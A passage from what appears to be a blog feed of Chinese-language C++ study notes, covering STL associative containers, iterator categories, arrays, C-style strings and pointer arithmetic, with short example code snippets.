class="built_in">find</span>(<span class="string">&quot;animal&quot;</span>);   <span class="comment">//查找键为 &quot;animal&quot; 的键值对</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//找到第一个键的值大于或等于 &quot;animal&quot; 的键值对</span></span><br><span class="line">    <span class="keyword">auto</span> iter = myMap.<span class="built_in">lower_bound</span>(<span class="string">&quot;animal&quot;</span>);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;lower：&quot;</span> &lt;&lt; iter-&gt;first &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; iter-&gt;second &lt;&lt; endl;</span><br><span class="line">   </span><br><span class="line">    <span class="comment">//找到第一个键的值大于 &quot;animal&quot; 的键值对</span></span><br><span class="line">    iter = myMap.<span class="built_in">upper_bound</span>(<span class="string">&quot;animal&quot;</span>);</span><br><span class="line">    cout &lt;&lt;<span class="string">&quot;upper：&quot;</span> &lt;&lt; iter-&gt;first &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; iter-&gt;second &lt;&lt; endl;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 找到值与 &quot;animal&quot; 的值相等的键值对</span></span><br><span class="line">    <span class="keyword">auto</span> myPair = myMap.<span class="built_in">equal_range</span>(<span class="string">&quot;animal&quot;</span>);  <span class="comment">// equal_range返回一个pair,第一个元素为lower_bound的返回值，第二个元素为upper_bound的返回值</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> iter = myPair.first; iter != myPair.second; ++iter) &#123;</span><br><span class="line">        cout &lt;&lt; iter-&gt;first &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; iter-&gt;second &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="set"><a href="#set" class="headerlink" title="set"></a>set</h4><p>定义在 &lt;set&gt; 头文件中，使用该容器存储的数据，各个元素键和值完全相同，且各个元素的值不能重复（保证了各元素键的唯一性）。该容器会自动根据各个元素的键（其实也就是元素值）的大小进行升序排序。</p><p>和 map、multimap 容器不同，<strong>使用 set 容器存储的各个键值对，要求键 key 和值 value 必须相等</strong>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">set&lt;string&gt; mySet&#123;<span class="string">&quot;animal&quot;</span>, <span class="string">&quot;plant&quot;</span>&#125;</span><br><span class="line">string str = <span class="string">&quot;planet&quot;</span>;</span><br><span class="line"><span class="keyword">auto</span> retpair = mySet.<span class="built_in">insert</span>(str);</span><br><span class="line"><span class="keyword">auto</span> retpair = mySet.<span class="built_in">emplace</span>(str);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除元素</span></span><br><span class="line"><span class="type">int</span> num = mySet.<span class="built_in">erase</span>(<span class="string">&quot;animal&quot;</span>);  <span class="comment">// 根据值定位，返回成功删除的元素个数</span></span><br><span class="line"><span class="keyword">auto</span> iter = mySet.<span class="built_in">erase</span>(myset.<span class="built_in">begin</span>(), --myset.<span class="built_in">end</span>());  <span class="comment">// 根据迭代器定位，返回删除后所指向的迭代器</span></span><br><span class="line">mySet.<span class="built_in">clear</span>()</span><br></pre></td></tr></table></figure><p>insert()函数返回的 pair 类型的值，其包含 2 个数据，一个迭代器和一个 bool 值：</p><ul><li>当向 set 容器添加元素成功时，该迭代器指向 set 容器新添加的元素，bool 类型的值为 true；</li><li>如果添加失败，即证明原 set 容器中已存有相同的元素，此时返回的迭代器就指向容器中相同的此元素，同时 bool 类型的值为 false。</li></ul><p>emplace()函数与insert()一样，也能像set容器中添加元素，且效率更高。</p><h3 id="2-3-哈希容器"><a href="#2-3-哈希容器" class="headerlink" title="2.3 哈希容器"></a>2.3 哈希容器</h3><p>C++ 11 新加入 4 种关联式容器，分别是 unordered_set 哈希集合、unordered_multiset 哈希多重集合、unordered_map 哈希映射以及 unordered_multimap 哈希多重映射。和排序容器不同，哈希容器中的元素是未排序的，元素的位置由哈希函数确定。</p><h2 id="3-iterator迭代器"><a href="#3-iterator迭代器" class="headerlink" title="3. iterator迭代器"></a>3. iterator迭代器</h2><p>在 C++ STL 中，对容器中数据的读和写，是通过迭代器完成的，扮演着容器和算法之间的胶合剂，使得算法的设计可以泛化到各种数据结构，隐藏容器的内部差异。</p><p>STL标准库为每一种标准容器定义了一种迭代器类型，这意味着，不同容器的迭代器也不同，其功能强弱也有所不同。容器的迭代器的功能强弱，决定了该容器是否支持 STL 中的某种算法。</p><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>常用的迭代器按功能强弱分为输入迭代器、输出迭代器、<strong>正向迭代器</strong>、<strong>双向迭代器</strong>、<strong>随机访问迭代器</strong> 5 种。主要使用后三种。</p><p><strong>1） 正向迭代器</strong></p><p>假设 p 是一个正向迭代器，则 p 支持 ++p，p++，*p 操作，还可以被复制或赋值，可以用 &#x3D;&#x3D; 和 !&#x3D; 运算符进行比较。此外，两个正向迭代器可以互相赋值。</p><p><strong>2） 双向迭代器</strong></p><p>双向迭代器具有正向迭代器的全部功能，除此之外，假设 p 是一个双向迭代器，则还可以进行 –p 或者 p– 操作（即一次向后移动一个位置）。</p><p><strong>3） 随机访问迭代器</strong></p><p>随机访问迭代器具有双向迭代器的全部功能。除此之外，假设 p 是一个随机访问迭代器，i 是一个整型变量或常量，则 p 还支持以下操作：</p><ul><li>p+&#x3D;i：使得 p 往后移动 i 个元素。</li><li>p-&#x3D;i：使得 p 往前移动 i 个元素。</li><li>p+i：返回 p 后面第 i 个元素的迭代器。</li><li>p-i：返回 p 前面第 i 个元素的迭代器。</li><li>p[i]：返回 p 后面第 i 个元素的引用。</li></ul><p>此外，两个随机访问迭代器 p1、p2 还可以用 &lt;、&gt;、&lt;&#x3D;、&gt;&#x3D; 运算符进行比较。另外，表达式 p2-p1 也是有定义的，其返回值表示 p2 所指向元素和 p1 所指向元素的序号之差（也可以说是 p2 和 p1 之间的元素个数减一）。</p><p>下表为 C++ 11 标准中不同容器所支持的迭代器类型：</p><table><thead><tr><th>容器</th><th>对应的迭代器类型</th></tr></thead><tbody><tr><td>array</td><td>随机访问迭代器</td></tr><tr><td>vector</td><td>随机访问迭代器</td></tr><tr><td>deque</td><td>随机访问迭代器</td></tr><tr><td>list</td><td>双向迭代器</td></tr><tr><td>set &#x2F; multiset</td><td>双向迭代器</td></tr><tr><td>map &#x2F; multimap</td><td>双向迭代器</td></tr><tr><td>forward_list</td><td>前向迭代器</td></tr><tr><td>unordered_map &#x2F; unordered_multimap</td><td>前向迭代器</td></tr><tr><td>unordered_set &#x2F; unordered_multiset</td><td>前向迭代器</td></tr><tr><td>stack</td><td>不支持迭代器</td></tr><tr><td>queue</td><td>不支持迭代器</td></tr></tbody></table><p><u>注意，容器适配器 stack 和 queue 没有迭代器，它们包含有一些成员函数，可以用来对元素进行访问。</u></p><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><table><thead><tr><th>迭代器定义方式</th><th>具体格式</th></tr></thead><tbody><tr><td>正向迭代器</td><td>容器类名::iterator 迭代器名;</td></tr><tr><td>常量正向迭代器</td><td>容器类名::const_iterator 迭代器名;</td></tr><tr><td>反向迭代器</td><td>容器类名::reverse_iterator 迭代器名;</td></tr><tr><td>常量反向迭代器</td><td>容器类名::const_reverse_iterator 迭代器名;</td></tr></tbody></table><p><code>*迭代器名</code>就可以表示迭代器指向的元素。</p><p>反向迭代器和正向迭代器的区别在于：</p><ul><li>对正向迭代器进行 ++ 操作时，迭代器会指向容器中的后一个元素；</li><li>而对反向迭代器进行 ++ 操作时，迭代器会指向容器中的前一个元素。</li></ul><p><u>注意，以上 4 种定义迭代器的方式，并不是每个容器都适用。有一部分容器同时支持以上 4 种方式，比如 array、deque、vector；而有些容器只支持其中部分的定义方式，例如 forward_list 容器只支持定义正向迭代器，不支持定义反向迭代器</u></p><h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span>  <span class="comment">//需要引入 vector 头文件</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; v&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>&#125;; <span class="comment">//v被初始化成有10个元素</span></span><br><span class="line">    <span class="comment">//第一种遍历方法：使用索引遍历，size返回元素个数</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; v.<span class="built_in">size</span>(); ++i)</span><br><span class="line">        cout &lt;&lt; v[i] &lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="comment">//第二种遍历方法：创建一个正向迭代器，当然，vector也支持其他 3 种定义迭代器的方式</span></span><br><span class="line">    vector&lt;<span class="type">int</span>&gt;::iterator it;</span><br><span class="line">    <span class="keyword">for</span> (i = v.<span class="built_in">begin</span>(); i != v.<span class="built_in">end</span>(); ++i)  <span class="comment">// 或者i &lt; v.end()</span></span><br><span class="line">        cout &lt;&lt; *i &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line"><span class="comment">//间隔一个输出</span></span><br><span class="line">    i = v.<span class="built_in">begin</span>();</span><br><span class="line">    <span class="keyword">while</span> (i &lt; v.<span class="built_in">end</span>()) &#123; </span><br><span class="line">        cout &lt;&lt; *i &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        i += <span class="number">2</span>; <span class="comment">// 随机访问迭代器支持 &quot;+= 整数&quot;  的操作</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-函数对象"><a href="#4-函数对象" class="headerlink" title="4. 函数对象"></a>4. 函数对象</h2><p>如果一个类将 () 运算符重载为成员函数，这个类就称为函数对象类，这个类的对象就是函数对象（又称仿函数）。</p><h2 id="5-适配器"><a href="#5-适配器" class="headerlink" title="5. 适配器"></a>5. 适配器</h2><p>可以使一个类的接口（模板的参数）适配成用户指定的形式，从而让原本不能在一起工作的两个类工作在一起。值得一提的是，容器、迭代器和函数都有适配器。</p><h2 id="6-内存分配器"><a href="#6-内存分配器" class="headerlink" title="6. 内存分配器"></a>6. 内存分配器</h2><p>为容器类模板提供自定义的内存申请和释放功能，由于往往只有高级用户才有改变内存分配策略的需求，因此内存分配器对于一般用户来说，并不常用。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;STL&quot;&gt;&lt;a href=&quot;#STL&quot; class=&quot;headerlink&quot; title=&quot;STL&quot;&gt;&lt;/a&gt;STL&lt;/h1&gt;&lt;p&gt;参考链接：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://c.biancheng.net/stl/&quot;&gt;http://c.bianch</summary>
      
    
    
    
    
    <category term="计算机基础" scheme="https://frankcao3.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>C/C++ 基础知识</title>
    <link href="https://frankcao3.github.io/posts/50843"/>
    <id>https://frankcao3.github.io/posts/50843</id>
    <published>2021-08-14T16:00:00.000Z</published>
    <updated>2023-10-06T09:09:05.985Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C-x2F-C"><a href="#C-x2F-C" class="headerlink" title="C&#x2F;C++"></a>C&#x2F;C++</h1><p>[TOC]</p><h2 id="1-数组"><a href="#1-数组" class="headerlink" title="1. 数组"></a>1. 数组</h2><p>一维数组可以用于实现线性表的顺序存储、哈希表等，二维数组可用来保存图的邻接矩阵等。</p><p>没有引用数组，但数组可以有引用。</p><p>有指针数组和数组指针。</p><h3 id="1-1-一维数组"><a href="#1-1-一维数组" class="headerlink" title="1.1 一维数组"></a>1.1 一维数组</h3><h4 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h4><p>在函数体外定义的内置类型数组（全局数组），元素会被初始化为0；</p><p>在函数体外定义的内置类型数组，元素不会被初始化。但是若初始化了部分元素，其后的元素也会被初始化为0；</p><p>若不是内置类型，不管在何处定义，均调用其默认构造函数为其初始化。若无默认构造函数，则报错。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> x[<span class="number">4</span>]=&#123;<span class="number">0</span>&#125;;   <span class="comment">//&#123;0,0,0,0&#125;</span></span><br><span class="line"><span class="type">int</span> y[<span class="number">4</span>]=&#123;<span class="number">1</span>&#125;;   <span class="comment">//&#123;1,0,0,0&#125;</span></span><br><span class="line"><span class="type">int</span>* a=<span class="keyword">new</span> <span class="type">int</span>[n];   <span class="comment">//大小未知时使用new动态声明</span></span><br><span class="line"><span class="keyword">delete</span> []a;          <span class="comment">//使用完毕后释放内存空间,[]a表示释放a所指数组的内存，如果a是类对象，分别调用每个数组元素a[i]的析构函数</span></span><br></pre></td></tr></table></figure><h4 id="C风格字符串"><a href="#C风格字符串" class="headerlink" title="C风格字符串"></a>C风格字符串</h4><ul><li><p>字符串常量</p><p>以<strong>双引号</strong>括起的字符序列，且C++中**均在末尾自动添加一个空字符’\0’**。注意’A’表示单个字符，”A”表示字符串常量，其表示A和\0两个字符。</p></li><li><p>字符数组</p><p>可以使用{}初始化（**最后一个元素必须为空字符’\0’**，以其作为字符串结束标志），也可以使用双引号括起的字符串初始化（自动在末尾添加’\0’）。</p></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> ca1[]=&#123;<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;+&#x27;</span>&#125;;        <span class="comment">//不是C风格字符串，末尾没有&#x27;\0&#x27;</span></span><br><span class="line"><span class="type">char</span> ca2[]=&#123;<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;\0&#x27;</span>&#125;;   <span class="comment">//是C风格字符串，长度为4</span></span><br><span class="line"><span class="type">char</span> ca3[]=<span class="string">&quot;C++&quot;</span>;                <span class="comment">//是C风格字符串，末尾自动添加&#x27;\0&#x27;，长度为4</span></span><br><span class="line"><span class="type">char</span> *cp2=ca2;                   <span class="comment">//是C风格字符串</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> ch3[<span class="number">6</span>]=<span class="string">&quot;Daniel&quot;</span>;      <span class="comment">//报错，因为字符串&quot;Daniel&quot;末尾其实还有一个空字符，长度为7而不是6</span></span><br></pre></td></tr></table></figure><p><strong><u><em>注意：使用C风格字符串的标准库函数时，牢记参数必须以空字符’\0’结束。</em></u></strong></p><p>若一char数组变量的末尾没有’\0’，但是又使用了C风格字符串的标准库函数（比如strcpy、strcat，strlen）进行处理，那么程序就会在该变量的内存空间中一直寻找空字符’\0’，直到恰好遇到为止，导致程序出错。</p><hr><h3 id="1-2-二维数组"><a href="#1-2-二维数组" class="headerlink" title="1.2 二维数组"></a>1.2 二维数组</h3><h4 id="初始化-1"><a href="#初始化-1" class="headerlink" title="初始化"></a>初始化</h4><ul><li><p>按行初始化：使用两层花括号初始化，每一个花括号代表一行。</p></li><li><p>顺序初始化：使用一个花括号初始化，逐行填入，缺少的默认初始化为0。</p><p>C++在声明和初始化二维数组时，若对所有元素都赋值，可以省略第一维。但声明更高维数组时，最多也只能省略第一维。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> ia[<span class="number">2</span>][<span class="number">4</span>]=&#123;</span><br><span class="line">&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;,</span><br><span class="line">&#123;<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> ia[<span class="number">2</span>][<span class="number">4</span>]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>&#125;;  <span class="comment">// 逐行填入，缺少的默认初始化为0</span></span><br><span class="line"><span class="type">int</span> ia[<span class="number">2</span>][<span class="number">4</span>]=&#123;&#123;<span class="number">0</span>&#125;,&#123;<span class="number">4</span>&#125;&#125;;    <span class="comment">// 部分初始化，每行缺少的默认初始化为0</span></span><br><span class="line"><span class="type">int</span> a[<span class="number">2</span>][<span class="number">4</span>] = &#123;<span class="number">0</span>,<span class="number">3</span>,<span class="number">6</span>&#125;;     <span class="comment">// &#123;0，3，6，0，0，0，0，0&#125;</span></span><br><span class="line"><span class="type">int</span> ia[][<span class="number">3</span>]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;  <span class="comment">//初始化所有元素时，可以省略第一维</span></span><br></pre></td></tr></table></figure><p>C&#x2F;C++中二维数组按照行优先顺序存储，所以二维数组a在内存空间中的地址顺序b有如下关系：<code>a[x][y] = b[x*列数+y]</code>  。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> M 3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 4</span></span><br><span class="line"><span class="type">int</span> a[M][N] = &#123;&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;, &#123;<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>&#125;, &#123;<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>&#125;&#125;;</span><br><span class="line">p = &amp;a[<span class="number">0</span>][<span class="number">0</span>];</span><br></pre></td></tr></table></figure><p><strong><code>a[i][j]</code>就等于*(p+i*N+j)</strong></p><p>另外由于是行优先顺序存储，所以<code>a[1][5]</code>也不会报错，会直接顺延到下一行，指向值10。</p></li><li><p>动态声明</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> **a = <span class="keyword">new</span> <span class="type">int</span>* [m];  <span class="comment">// m行</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;m; i++)</span><br><span class="line">    a[i] = <span class="keyword">new</span> <span class="type">int</span> [n];  <span class="comment">// n列</span></span><br><span class="line"><span class="comment">// 手动动态声明的数组需要手动释放内存</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;m;i++)</span><br><span class="line">    <span class="keyword">delete</span> []a[i];</span><br><span class="line"><span class="keyword">delete</span> []a;</span><br></pre></td></tr></table></figure></li></ul><hr><h3 id="1-3-指针"><a href="#1-3-指针" class="headerlink" title="1.3 指针"></a>1.3 指针</h3><h4 id="指针运算"><a href="#指针运算" class="headerlink" title="指针运算"></a>指针运算</h4><p>在C&#x2F;C++中，指针虽然经常被当作整数来处理，但是其支持的操作非常有限，合法的运算包括：指针与整数的加减、同类型指针的比较、同类型两指针相减。</p><p><strong>当指针与一个整数量进行算数运算时，整数在执行加法运算前始终会根据合适的大小进行调整（相乘）。</strong>比如，字符指针加1，则运算结果产生的指针指向内存中的下一个字符（整数量乘1）；如果指针指向float类型的变量，由于float类型占据4个字节，所以指针加1时实际加到指针上的整型值为4（整数量乘4），即增加一个float大小。<strong>所以指针的大小与所指变量类型相关，其运算中指针增加的值也与这个类型相关。</strong></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-20220613141312988.png" alt="image-20220613141312988"></p><ul><li><strong>指针的算数运算</strong></li></ul><p>C的指针的算术运算只局限于两种形式。第-种形式是: <strong>指针+ &#x2F; - 整数</strong>。这种形式用于指向数组中某个元素的指针。</p><p>第二种类型的指针运算具有如下的形式: <strong>指针-指针</strong>。只有当两个指针都指向同一个数组中的元素时，才允许从一个指针减去另一个指针。减法运算的值是两个指针在内存中的距离(以数组元素的长度为单位，而不是以字节为单位)。即相差多少个元素就是多少。</p><p>如果两个指针所指向的不是同一个数组中的元素，那么它们之间相减的结果是未定义的。程序员无从知道两个数组在内存中的相对位置，如果不知道这一点， 两个指针之间的距离就毫无意义。</p><ul><li><strong>指针的关系运算</strong></li></ul><p>还可以进行&lt;、&lt;&#x3D;、&gt;、&gt; &#x3D;运算，不过前提是它们都指向同-个数组中的元素。根据你所使用的操作符，比较表达式将告诉你哪个指针指向数组中更前或更后的元素。</p><h4 id="指针数组与数组指针"><a href="#指针数组与数组指针" class="headerlink" title="指针数组与数组指针"></a>指针数组与数组指针</h4><ul><li><p><strong>指针数组</strong>：由指针作为元素组成的数组。定义：<code>int* a[10]</code></p></li><li><p><strong>数组指针</strong>：一个指向数组的指针。定义：<code>int (*p)[10]</code>为指向有10个元素的整形数组的指针，因为[]的优先级高于<em>，所以要有括号，用[10]表示*p指向的数组有10个元素。*<em>数组指针运算时以一整个数组大小为单位。</em></em></p></li></ul><p>对于二维数组<code>int w[3][4]</code>，定义一个与w等价的数组指针：<code>int (*pw)[4] = w; </code> </p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-20220613143246893.png" alt="image-20220613143246893"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-20220613143516876.png" alt="image-20220613143516876"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> a[]=<span class="string">&quot;hello&quot;</span>;</span><br><span class="line">a[<span class="number">0</span>] = <span class="string">&#x27;x&#x27;</span>;  <span class="comment">// 变成xello</span></span><br><span class="line"><span class="type">char</span>* q=a;</span><br><span class="line">q[<span class="number">0</span>]=<span class="string">&#x27;b&#x27;</span>;    <span class="comment">// 变成bello</span></span><br><span class="line"><span class="type">char</span> *p=<span class="string">&quot;hello&quot;</span>;  <span class="comment">// 把存放该字符串的首地址装入指针变量</span></span><br><span class="line">p[<span class="number">0</span>]=<span class="string">&#x27;x&#x27;</span>;    <span class="comment">// 该语句错误</span></span><br></pre></td></tr></table></figure><p>最后一个语句错误。a是数组，内存分配在栈上，故可以通过数组名或指向数组的指针进行修改，而p指向的是位于<strong>文字常量区的字符串，是不允许被修改的</strong>，故通过指针修改错误。但使用p[0]访问相应元素是正确的，只是不能修改。</p><p>指针和数组密切相关。特别是在表达式中使用数组名时，该名字会自动转换为指向数组首元素(第0元素)的指针。<strong>但是注意数组的首地址是常量，不可以进行赋值操作。</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> ia[]=&#123;<span class="number">0</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>&#125;;</span><br><span class="line">ia += <span class="number">1</span>;   <span class="comment">// 编译错误，数组首地址ia为常量，不可变更；可以使用char* p=a; p+=2;实现</span></span><br><span class="line"><span class="type">int</span> *ip=ia;</span><br><span class="line"><span class="comment">// 修改第四个元素为9，可使用如下操作：</span></span><br><span class="line">ia[<span class="number">4</span>]=<span class="number">9</span>;</span><br><span class="line">*(ia+<span class="number">4</span>)=<span class="number">9</span>;</span><br><span class="line">ip[<span class="number">4</span>]=<span class="number">9</span>;</span><br><span class="line">*(ip+<span class="number">4</span>)=<span class="number">9</span>;</span><br></pre></td></tr></table></figure><p><strong><u>注意：</u><strong>对于<code>int a[10];</code>来说，</strong>&amp;a[0]等价于a，为指向数组<u>首元素的指针</u>，每加1就跳过4个字节（int类型）。而&amp;a为指向<u>数组的指针</u>，与a的类型不同（&amp;a的类型为int(*)[10]），但是指向的单元相同。</strong></p><blockquote><p>例题：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-20220614102002448.png" alt="image-20220614102002448"></p></blockquote><p><strong>在二维数组<code>int a[4][5]</code>中</strong>，同理，其可以看成由4个数组作为元素组成的数组。那么a的第一个元素为数组a[0]，然后是数组a[1]、a[2]、a[3]，<strong>a表示指向数组首元素a[0]的指针，即数组指针</strong>。而a[0]本身为包含5个元素的数组，所以<strong>a[0]表示指向数组a[0]首元素a[0][0]的指针</strong>。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-20220614110311876.png" alt="image-20220614110311876"></p><p>因此：</p><p><strong>&amp;a</strong>：类型为整个二维数组的数组指针，int(*)[4][5]。&amp;a[0]等价于a，&amp;a+1直接跳到二维数组末尾。</p><p><strong>a</strong>：类型为int(*)[5]，为a的第一个数组元素的数组指针。且a为常量，不可以进行赋值运算。a+i指向a[i]，a加1将直接跳过5个元素，即*(a+1)相当于a[i]。</p><p>***a或a[0]*<em>：类型为int</em>，指针，指向数组a[0]的首元素a[0][0]。</p><p>***(a+1)或a[1]**：指向数组a[1]首元素a[1][0]的指针。</p><p><strong>*(*(a+1)+2）</strong>：为数组a[1]的第二个元素a[1][2].</p><blockquote><p>例题：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-20220615094712862.png" alt="image-20220615094712862"></p></blockquote><hr><h3 id="1-4-数组的应用"><a href="#1-4-数组的应用" class="headerlink" title="1.4 数组的应用"></a>1.4 数组的应用</h3><ul><li><p>线性表的顺序存储</p><p>线性表是一种逻辑结构，线性表的顺序存储成为顺序表。</p></li></ul><p>**<u>注意</u>**：线性表中元素的位序是从1开始的，而数组元素下标是从0开始的。</p><p><strong><u>时间复杂度：</u></strong></p><p>存取访问：通过首地址和元素序号可以在O(1)内找到指定元素。</p><p>插入：表尾插入O(1)，表头插入O(n)。平均复杂度O(n)。</p><p>删除：表尾插入O(1)，表头插入O(n)。平均复杂度O(n)。</p><p>按值查找：目标就在表头O(1)，目标在表尾O(n)。平均复杂度O(n)。</p><hr><h2 id="2-字符串"><a href="#2-字符串" class="headerlink" title="2. 字符串"></a>2. 字符串</h2><h3 id="2-1-基础操作"><a href="#2-1-基础操作" class="headerlink" title="2.1 基础操作"></a>2.1 